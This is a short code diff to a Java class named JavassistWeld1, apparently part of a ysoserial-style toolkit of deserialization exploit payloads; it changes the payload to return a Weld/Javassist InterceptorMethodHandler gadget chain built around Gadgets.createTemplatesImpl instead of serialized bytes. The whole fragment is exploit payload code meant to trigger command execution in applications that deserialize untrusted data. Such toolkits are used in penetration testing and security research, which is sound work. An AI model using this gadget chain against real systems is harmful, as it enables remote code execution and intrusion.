@@ -25,7 +25,7 @@ import java.util.*;
 
 public class JavassistWeld1 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         final Object tpl = Gadgets.createTemplatesImpl(type, param);
 
         InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
@@ -64,18 +64,7 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
             }
         };
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
+        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
 
-        return bytes;
-
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
     }
 }
